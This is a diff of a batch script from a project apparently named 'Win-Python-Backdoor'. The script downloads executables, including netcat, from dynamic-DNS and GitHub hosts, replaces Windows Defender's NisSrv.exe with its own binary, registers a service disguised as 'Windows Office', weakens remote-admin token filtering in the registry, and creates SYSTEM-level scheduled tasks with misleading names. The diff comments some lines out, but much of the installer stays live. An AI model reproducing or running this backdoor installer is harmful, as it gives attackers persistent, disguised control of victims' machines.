@@ -35,7 +35,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url=http://config01.homepc.it
 set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
-%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/svc/wup.php?pc=pdf_%computername%','%windir%\pdf.txt')"
+rem %windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/svc/wup.php?pc=pdf_%computername%','%windir%\pdf.txt')"
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
 %windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')"
 if "%PROCESSOR_ARCHITECTURE%"=="x86" goto 32BIT
@@ -60,9 +60,9 @@ rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Back
 
 taskkill /f /im woffice.exe
 taskkill /f /im wscript.exe
-schtasks /delete /tn sys /F
-schtasks /delete /tn syskill /F
-schtasks /delete /tn office_get /F
+rem schtasks /delete /tn sys /F
+rem schtasks /delete /tn syskill /F
+rem schtasks /delete /tn office_get /F
 
 rem wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
 
@@ -70,9 +70,9 @@ wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
 wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
 wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
 wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
-schtasks /create /tn office_get /xml %windir%\office_get.xml /F
+rem schtasks /create /tn office_get /xml %windir%\office_get.xml /F
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
+rem wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
 rem %windir%\wofficeie1.exe
 rem SLEEP 10
 rem taskkill /f /im NisSrv.exe
@@ -82,9 +82,9 @@ rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
 copy /Y %windir%\woffice.exe "C:\Program Files\Windows Defender\NisSrv.exe"
 sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
 net start wup
-schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
-schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
-schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
+rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
+rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
+rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
 rem schtasks /create /tn sys /xml %windir%\sys.xml /F
 rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
 wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\init.vbs
